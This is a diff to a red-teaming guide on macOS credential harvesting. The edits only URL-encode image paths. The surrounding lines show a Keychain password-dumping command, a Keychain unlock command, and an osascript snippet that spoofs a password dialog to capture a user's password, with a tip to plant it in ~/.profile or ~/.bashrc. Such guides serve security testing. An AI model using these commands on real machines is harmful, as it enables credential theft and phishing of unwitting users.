@@ -47,7 +47,7 @@ security find-internet-password -a "someaccount@gmail.com" -w
 ```
 The good thing (bad for the red teamer) about the Keychain is that it requires the user's password to access and open:
 
-![keychainpopup.png](../../assets/Red-teaming/Credential Harvesting/keychainpopup.png)
+![keychainpopup.png](../../assets/Red-teaming/Credential%20Harvesting/keychainpopup.png)
 
 If the Keychain is locked, it can be unlocked with this command:
 ```bash
@@ -55,7 +55,7 @@ security unlock-keychain
 ```
 This will prompt for the user's password to unlock the Keychain (if it is locked):
 
-![keychainpopup2.png](../../assets/Red-teaming/Credential Harvesting/keychainpopup2.png)
+![keychainpopup2.png](../../assets/Red-teaming/Credential%20Harvesting/keychainpopup2.png)
 
 ---
 # Phishing and credential dialog spoofing
@@ -64,7 +64,7 @@ This will prompt for the user's password to unlock the Keychain (if it is locked
 osascript -e 'display notification "Hello World!"'
 ```
 
-![osascript.png](../../assets/Red-teaming/Credential Harvesting/osascript.png)
+![osascript.png](../../assets/Red-teaming/Credential%20Harvesting/osascript.png)
 
 - Create a password dialog
 ```bash
@@ -76,7 +76,7 @@ answer')
 echo $PWD_SPOOF
 ```
 
-![osascriptPWD.png](../../assets/Red-teaming/Credential Harvesting/osascriptPWD.png)
+![osascriptPWD.png](../../assets/Red-teaming/Credential%20Harvesting/osascriptPWD.png)
 
 > **Note:**
 >  One of the ways to deploy this is by putting it in ~/.profile or ~/.bashrc or by sending it in a file.
